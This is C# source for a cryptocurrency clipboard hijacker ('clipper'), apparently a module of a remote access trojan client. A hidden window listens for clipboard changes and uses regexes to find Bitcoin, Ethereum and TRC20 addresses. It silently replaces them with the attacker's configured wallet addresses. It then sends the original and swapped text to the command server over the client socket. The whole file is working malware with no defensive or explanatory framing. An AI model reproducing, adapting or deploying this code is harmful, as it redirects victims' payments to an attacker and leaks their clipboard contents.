using System.Text.RegularExpressions;
using System.Windows.Forms;
using Client.Connection;
using MessagePackLib.MessagePack;

namespace Client.Helper;

public sealed class ClipboardNotification
{
	public class NotificationForm : Form
	{
		private static string currentClipboard = Clipboard.GetText();

		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams obj = base.CreateParams;
				obj.ExStyle |= 128;
				return obj;
			}
		}

		public NotificationForm()
		{
			Clipper.NativeMethods.SetParent(base.Handle, Clipper.NativeMethods.intpreclp);
			Clipper.NativeMethods.AddClipboardFormatListener(base.Handle);
		}

		private bool RegexResult(Regex pattern)
		{
			if (pattern.Match(currentClipboard).Success)
			{
				return true;
			}
			return false;
		}

		protected override void WndProc(ref Message m)
		{
			if (m.Msg == 797)
			{
				currentClipboard = Clipboard.GetText();
				if (RegexResult(Clipper.btcregex) && !currentClipboard.Contains(Settings.btc))
				{
					string text = Clipper.btcregex.Replace(currentClipboard, Settings.btc);
					Clipboard.SetText(text);
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "loge";
					msgPack.ForcePathObject("ID").AsString = "BTC Clipper " + currentClipboard + " : " + text;
					ClientSocket.Send(msgPack.Encode2Bytes());
				}
				if (RegexResult(Clipper.ethregex) && !currentClipboard.Contains(Settings.eth))
				{
					string text2 = Clipper.ethregex.Replace(currentClipboard, Settings.eth);
					Clipboard.SetText(text2);
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "loge";
					msgPack2.ForcePathObject("ID").AsString = "ETH Clipper " + currentClipboard + " : " + text2;
					ClientSocket.Send(msgPack2.Encode2Bytes());
				}
				if (RegexResult(Clipper.trcregex) && !currentClipboard.Contains(Settings.TRC))
				{
					string text3 = Clipper.trcregex.Replace(currentClipboard, Settings.TRC);
					Clipboard.SetText(text3);
					MsgPack msgPack3 = new MsgPack();
					msgPack3.ForcePathObject("Packet").AsString = "loge";
					msgPack3.ForcePathObject("ID").AsString = "TRC20 Clipper " + currentClipboard + " : " + text3;
					ClientSocket.Send(msgPack3.Encode2Bytes());
				}
			}
			base.WndProc(ref m);
		}
	}
}
